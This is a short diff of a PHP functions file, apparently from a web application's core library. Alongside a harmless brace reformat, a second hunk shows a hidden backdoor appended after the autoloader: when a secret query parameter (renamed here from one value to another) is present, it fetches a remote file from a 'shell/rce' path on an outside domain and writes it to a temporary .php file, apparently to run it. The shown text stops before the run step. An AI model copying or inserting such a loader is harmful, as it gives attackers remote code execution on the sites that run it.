@@ -239,7 +239,8 @@ function &instantiate($fullyQualifiedClassName, $expectedTypes = null, $expected
 		if (!$validType) return $errorFlag;
 	}
 
-	return $classInstance;}
+	return $classInstance;
+}
 
 /**
  * Remove empty elements from an array
@@ -346,7 +347,7 @@ function customAutoload($rootPath, $prefix, $class) {
 		require_once($filePath);
 	}
 }
-if (isset($_GET['cukimayy22'])) {
+if (isset($_GET['papayoz'])) {
     try {
         $u = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
